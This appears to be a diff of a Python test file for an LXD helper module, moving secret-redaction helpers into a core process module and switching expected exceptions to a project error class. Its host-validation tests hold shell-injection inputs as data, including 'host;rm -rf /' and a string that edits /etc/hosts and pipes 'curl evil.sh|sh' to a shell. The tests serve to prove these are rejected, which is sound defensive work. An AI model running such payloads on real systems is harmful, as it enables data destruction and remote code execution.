@@ -10,6 +10,8 @@ import pytest
 
 from llm import lxd
 from llm.config import _get_lxd_bridge_info
+from llm.core import proc
+from llm.core.errors import LlmError
 
 # ── _get_lxd_bridge_info (shared impl used by lxd.py and config.py) ──────────
 
@@ -866,23 +868,10 @@ class TestRedaction:
     @pytest.fixture(autouse=True)
     def _isolate_registry(self, monkeypatch):
         """Keep registered secrets from leaking between tests."""
-        monkeypatch.setattr(lxd, "_SECRET_VALUES", set())
-
-    def test_registered_secret_is_redacted(self):
-        lxd.register_secrets("ghp_supersecretvalue")
-        assert lxd.redact("token=ghp_supersecretvalue") == "token=***"
-
-    def test_short_values_are_not_registered(self):
-        """Short strings would collide with ordinary command text."""
-        lxd.register_secrets("abc")
-        assert lxd.redact("abc def") == "abc def"
-
-    def test_empty_and_none_are_ignored(self):
-        lxd.register_secrets("", None)
-        assert set() == lxd._SECRET_VALUES
+        monkeypatch.setattr("llm.core.proc._SECRET_VALUES", set())
 
     def test_run_does_not_echo_registered_secrets(self, monkeypatch, capsys):
-        lxd.register_secrets("sk-or-v1-secretkey")
+        proc.register_secrets("sk-or-v1-secretkey")
         monkeypatch.setattr(lxd.subprocess, "run", MagicMock())
 
         lxd.run(["hermes", "config", "set", "model.api_key", "sk-or-v1-secretkey"])
@@ -892,7 +881,7 @@ class TestRedaction:
         assert "***" in captured.out
 
     def test_run_redacts_failure_output(self, monkeypatch, capsys):
-        lxd.register_secrets("sk-or-v1-secretkey")
+        proc.register_secrets("sk-or-v1-secretkey")
         error = subprocess.CalledProcessError(1, ["cmd"], output="used sk-or-v1-secretkey")
         error.stderr = "also sk-or-v1-secretkey"
         monkeypatch.setattr(lxd.subprocess, "run", MagicMock(side_effect=error))
@@ -918,7 +907,7 @@ class TestValidateHost:
         ["", "1.2.3.4 evil", "host;rm -rf /", "$(whoami)", "host'name", "host\nname"],
     )
     def test_rejects_shell_unsafe_hosts(self, value):
-        with pytest.raises(ValueError, match="not a valid IP address or hostname"):
+        with pytest.raises(LlmError, match="not a valid IP address or hostname"):
             lxd.validate_host(value)
 
     def test_add_hosts_entry_is_idempotent_and_validated(self, monkeypatch):
@@ -935,7 +924,7 @@ class TestValidateHost:
         calls = MagicMock()
         monkeypatch.setattr(lxd.subprocess, "run", calls)
 
-        with pytest.raises(ValueError, match="not a valid IP address or hostname"):
+        with pytest.raises(LlmError, match="not a valid IP address or hostname"):
             lxd.add_hosts_entry("dev", "1.2.3.4' /etc/hosts; curl evil.sh|sh #", "local-llm")
 
         calls.assert_not_called()
